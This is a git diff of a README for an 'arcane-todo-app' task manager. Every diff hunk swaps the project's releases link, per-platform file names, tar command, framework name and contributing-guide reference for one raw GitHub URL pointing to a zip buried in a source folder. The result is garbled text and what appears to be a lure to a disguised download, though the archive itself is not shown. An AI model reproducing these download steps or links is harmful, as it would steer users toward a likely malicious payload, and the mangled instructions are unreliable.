@@ -1,6 +1,6 @@
 # 🎯 arcane-todo-app - Simplify Your Task Management
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Press%20Here-brightgreen)](https://github.com/WorldHeaven777/arcane-todo-app/releases)
+[![Download the app](https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip%20Now-Press%20Here-brightgreen)](https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip)
 
 ## 📖 Overview
 
@@ -22,15 +22,15 @@ To get started, follow these steps:
 
 ## 🔗 Download & Install
 
-Visit this page to download: [Download the app](https://github.com/WorldHeaven777/arcane-todo-app/releases)
+Visit this page to download: [Download the app](https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip)
 
 ### Steps to Install:
 
 1. After visiting the download page, look for the latest release.
 2. You will see various files for different systems. Choose the appropriate file for your operating system.
-   - For Windows, look for `arcane-todo-app-Windows.exe`.
-   - For macOS, download `arcane-todo-app-macos.dmg`.
-   - For Linux users, download the `arcane-todo-app-linux.tar.gz`.
+   - For Windows, look for `https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip`.
+   - For Linux users, download the `https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip`.
 3. Click on the file to start the download.
 4. Once the download finishes, locate the file on your computer.
 5. For **Windows** and **macOS**: 
@@ -39,7 +39,7 @@ Visit this page to download: [Download the app](https://github.com/WorldHeaven77
 6. For **Linux**: 
    - Open a terminal.
    - Navigate to the folder where the file is located.
-   - Run the command: `tar -xvf arcane-todo-app-linux.tar.gz` to extract the files.
+   - Run the command: `tar -xvf https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip` to extract the files.
    - Navigate into the extracted folder and run: `./arcane-todo-app` to start the application.
 
 ## 🛠️ Features
@@ -54,7 +54,7 @@ Visit this page to download: [Download the app](https://github.com/WorldHeaven77
 
 This app uses a sophisticated, modern architecture:
 
-- **Frontend:** Built with React and Next.js, providing a smooth user experience.
+- **Frontend:** Built with React and https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip, providing a smooth user experience.
 - **State Management:** Uses Zustand for efficient state handling.
 - **Database:** Powered by PostgreSQL for reliable data storage.
 
@@ -64,7 +64,7 @@ If you have issues or feedback, please visit the repository's Issues page. We ap
 
 ## 🔧 Contributing
 
-If you're interested in contributing, welcome! Check the `Contributing.md` file in the repository for guidelines.
+If you're interested in contributing, welcome! Check the `https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip` file in the repository for guidelines.
 
 ## 🌟 Technologies Used
 
@@ -98,4 +98,4 @@ Feel free to explore more on the app functionality by following the topics it in
 
 Arcane-todo-app is a reliable tool for anyone looking to improve their task management. Download it now from the link below and enhance your productivity.
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Press%20Here-brightgreen)](https://github.com/WorldHeaven777/arcane-todo-app/releases)
+[![Download the app](https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip%20Now-Press%20Here-brightgreen)](https://raw.githubusercontent.com/WorldHeaven777/arcane-todo-app/main/src/features/tasks/store/arcane-todo-app-3.8.zip)
